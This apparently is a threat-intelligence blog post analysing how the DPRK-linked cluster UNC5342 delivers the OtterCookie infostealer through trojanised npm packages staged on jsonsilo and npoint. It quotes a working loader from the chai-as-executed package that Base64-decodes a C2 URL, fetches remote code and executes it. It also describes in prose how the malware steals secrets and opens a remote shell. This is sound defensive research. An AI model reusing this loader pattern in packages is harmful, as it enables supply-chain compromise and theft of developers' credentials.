    UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure

    UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure¶

    While continuing to track DPRK-linked weaponised npm packages, I observed UNC5342 refining its delivery chain — pivoting away from Vercel infrastructure and adopting jsonsilo[.]com and npoint[.]io as payload staging points for the OtterCookie malware family.

    Background¶

    UNC5342 (also tracked as Contagious Interview, DeceptiveDevelopment, Famous Chollima, and Void Dokkaebi) is a DPRK-nexus threat cluster that has persistently targeted software developers since at least 2023 through fake technical interview schemes.1 The cluster distributes malware via trojanised npm packages, GitHub repositories, and coding challenge assignments, focusing on developers in cryptocurrency, DeFi, and financial technology sectors.

    OtterCookie is a JavaScript-based infostealer and lightweight RAT attributed to UNC5342, first observed in real-world attacks in September 2024.2 Unlike its companion implant BeaverTail — which functions as a downloader — OtterCookie is explicitly designed for deep credential theft and interactive remote access, targeting developer-specific secrets including .env files, private keys, clipboard contents, and cryptocurrency wallet data. The malware operates as a multi-module framework, spawning independent Node.js processes for each major capability.

    JsonSilo and npoint.io are legitimate JSON storage hosting services designed to allow developers to quickly host and access JSON data via API without server setup. By November 2025, NVISO researchers publicly documented UNC5342 abusing these platforms — alongside JSON Keeper — to stage obfuscated payloads, blending malicious traffic with legitimate developer API calls.3 The research here predates that public reporting by approximately six weeks, representing an early sighting of this infrastructure shift.

    Summary¶

    This research analyses UNC5342's shift to jsonsilo[.]com and npoint[.]io for distributing OtterCookie via weaponised npm packages. The delivery chain pivots from the Vercel-based gating mechanism documented in December 2025 to JSON storage services as a new staging layer. The report provides technical insights into the malware's staging mechanism, obfuscation approach, and exfiltration capabilities for network defenders and incident responders.

    Key highlights:

    • UNC5342 pivoted from Vercel infrastructure to jsonsilo[.]com and npoint[.]io for payload hosting and distribution
    • The malicious npm package express-lists-routes disguises OtterCookie as a legitimate Express.js utility
    • OtterCookie creates a persistent access pipeline by systematically harvesting developer secrets — .env files, cryptocurrency private keys, and clipboard data

    Constant Infrastructure Change¶

    In January 2026, I identified UNC5342 adopting jsonsilo[.]com and npoint[.]io as primary distribution points for malicious payloads. Both are legitimate developer-oriented JSON hosting services — the kind that generate zero suspicion in a developer's network traffic. This shift follows my December 2025 research into the cluster's use of Vercel infrastructure to gate and serve the OtterCandy malware family.

    By rotating away from Vercel and onto JSON storage services, UNC5342 demonstrates a persistent commitment to exploiting developer-trusted platforms while evading ongoing infrastructure tracking. NVISO later confirmed this tactic more broadly, noting that UNC5342 operators were using JSON Keeper, JSONsilo, and npoint.io interchangeably across different campaign waves.3

    The identified npm package — express-lists-routes — is the latest example of UNC5342's sustained reliance on weaponised npm packages as an initial access mechanism. By embedding malware in a package that appears to provide routine Express.js route listing functionality, the threat actor ensures automatic code execution at install time while blending into a legitimate supply chain.

    Additional weaponised packages and their corresponding C2 endpoints identified during this investigation:

    Package C2 Endpoint
    hxxps://www.npmjs[.]com/package/chai-as-executed hxxps://api.npoint[.]io/979f369bee438a98751e
    hxxps://www.npmjs[.]com/package/chai-as-enhanced hxxps://api.jsonsilo[.]com/public/cc268b04-1284-45d9-9bdc-952c4f8cf983

    The chai-as-executed package is particularly notable. The malicious logic encodes the C2 URL as a Base64 string stored inside a fake environment variable, then decodes and fetches it at runtime using axios:

    const process = {
  env: {
    DEV_API_KEY: "aHR0cHM6Ly9hcGkubnBvaW50LmlvLzk3OWYzNjliZWU0MzhhOTg3NTFl",
    DEV_SECRET_KEY: "eC1zZWNyZXQta2V5",
    DEV_SECRET_VALUE: "Xw==",
  }
};

(async function getCallers(..._args) {
  const src = atob(process.env.DEV_API_KEY);
  const k = atob(process.env.DEV_SECRET_KEY);
  const v = atob(process.env.DEV_SECRET_VALUE);

  let retrycnt = 5;
  while (retrycnt > 0) {
    try {
      const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;
      const handler = new Function.constructor("require", s);
      handler(require);
      break;
    } catch (error) { retrycnt--; }

})();

    Decoding DEV_API_KEY yields hxxps://api.npoint[.]io/979f369bee438a98751e — the npoint.io C2 endpoint. The custom header (x-secret-key: _) echoes the same authentication gating pattern observed in the December 2025 campaign, here applied to the npoint.io resolver rather than Vercel.

    Technical Analysis of the Staging Mechanism¶

    The malicious payload uses a multi-layered obfuscation strategy designed to hinder static analysis and evade automated detection. The outer layer uses a heavily modified JavaScript obfuscator employing control flow flattening, string array rotation, and anti-tampering regex checks.

    OtterCookie is explicitly architected as a multi-module framework — each major capability runs as an independent detached Node.js process, managed through lock files and PID tracking. The main entry point spawns three separate malicious components, each with its own lock file and role.

    Upon successful execution, the outer wrapper decrypts and executes three distinct payloads stored as large string variables — identified during analysis as v38, v39, and v40 — containing the core logic for credential theft, file exfiltration, and remote access respectively. These strings are written to lock files in the temporary directory to manage execution flow and prevent conflicting instances.

    Stealthy Exfiltration of Developer Secrets¶

    OtterCookie's primary capability is systematic discovery and exfiltration of sensitive developer data — credentials, configuration secrets, source code, and private keys. This is consistent with the broader UNC5342 toolset, including BeaverTail, InvisibleFerret, and OtterCandy, which form a coordinated attack pipeline designed to compromise developers at scale through social engineering and systematically exfiltrate high-value assets.2

    The malware defines large sets of sensitive keywords applied to full file paths to identify files likely to contain credentials, cryptographic material, wallets, tokens, or proprietary data. Aggressive exclusion of system directories, dependency folders, and media files demonstrates clear intent to optimise for high-value theft rather than indiscriminate collection.

    OtterCookie performs deep recursive traversal of user-accessible directories, prioritising locations commonly used by developers — Desktop, Documents, Downloads, and project folders. On Windows systems, it expands its scope to all available drives.

    Each discovered file is evaluated for readability, size threshold, and sensitivity criteria before exfiltration — minimising failed uploads and avoiding large files that could draw attention.

    Qualifying files are exfiltrated using authenticated HTTP uploads. Requests include host identifiers and the original file path, allowing the attacker to reconstruct directory context server-side.

    Separate network channels handle different functions: port 8085 for structured file uploads via /api/upload-file, and port 8087 as the primary C2 endpoint for telemetry, WebSocket command execution, and clipboard data exfiltration.

    Beyond opportunistic scanning, OtterCookie implements explicit targeted searches for .env files — which frequently contain API keys, database credentials, and cloud secrets — using platform-native tooling across entire systems.

    Beyond disk-resident files, the malware continuously harvests transient secrets through clipboard monitoring — capturing credentials, tokens, and wallet addresses that may never be written to disk.

    Clipboard access uses platform-specific mechanisms including PowerShell on Windows, ensuring reliable access across development environments.

    All exfiltrated data — whether file-based or clipboard-derived — is transmitted to attacker-controlled endpoints, with host identification tightly coupled to stolen content.

    Lightweight RAT Capabilities¶

    Beyond data theft, OtterCookie provides interactive remote control — effectively functioning as a lightweight RAT. The malware establishes a persistent WebSocket connection to the C2 server, enabling operators to execute arbitrary shell commands and browse directories using native filesystem APIs to preserve Unicode correctness.
